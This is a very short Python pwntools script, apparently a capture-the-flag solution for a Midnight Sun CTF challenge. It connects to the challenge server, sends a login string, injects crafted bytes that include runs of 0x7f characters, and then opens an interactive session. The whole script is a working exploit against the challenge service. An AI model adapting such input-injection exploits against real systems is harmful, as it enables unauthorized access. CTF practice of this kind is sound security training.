from pwn import *

p = remote("hfs-os-01.play.midnightsunctf.se", 31337)
# p = process("./run")

sleep(1)
p.sendline("sojupwner")
p.send("\x7f" * 11 + "\x4f\x01\x4f\x01")
p.send("\x7f" * 6 + "LAG2")
p.send("pong")
p.interactive()